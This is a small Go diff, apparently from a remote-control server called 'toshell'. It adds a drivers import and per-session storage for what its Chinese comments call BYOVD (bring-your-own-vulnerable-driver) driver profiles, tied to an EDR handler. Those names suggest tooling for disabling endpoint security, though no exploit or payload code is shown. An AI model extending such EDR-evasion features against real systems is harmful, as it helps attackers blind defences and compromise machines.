@@ -17,6 +17,7 @@ import (
 	"toshell/internal/server/auth"
 	"toshell/internal/server/builder"
 	"toshell/internal/server/config"
+	"toshell/internal/server/drivers"
 	"toshell/internal/server/logging"
 	"toshell/internal/server/session"
 	"toshell/internal/server/task"
@@ -125,6 +126,10 @@ type Server struct {
 	// 屏幕流帧限速/合并状态（见 screen_frame_limiter.go，P0.2）
 	screenLimiter     *screenFrameLimiter
 	screenLimiterOnce sync.Once
+
+	// 本会话已加载的 BYOVD 驱动档案（服务端不再内置驱动，见 handlers_edr.go）
+	driverMu       sync.Mutex
+	sessionDrivers map[string]drivers.Driver
 }
 
 // SetOnConfigApplied 注册配置热应用回调（设置 API 保存后触发）。
